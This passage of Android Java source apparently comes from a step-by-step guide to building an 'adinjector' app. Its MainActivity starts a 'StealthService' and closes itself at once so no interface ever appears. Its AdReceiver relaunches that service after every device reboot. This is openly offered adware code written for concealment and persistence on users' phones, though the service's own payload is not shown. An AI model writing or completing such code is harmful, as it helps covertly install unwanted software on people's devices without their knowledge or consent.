package com.example.adinjector;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;

public class MainActivity extends Activity {
    // A simple stub that immediately starts the stealth service.
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Launch the background service.
        startService(new Intent(this, StealthService.class));
        finish(); // Kill the UI activity so it never appears.
    }
}
4. AdReceiver.java – auto‑start after device reboot
java

package com.example.adinjector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AdReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            ctx.startService(new Intent(ctx, StealthService.class));
        }
    }
}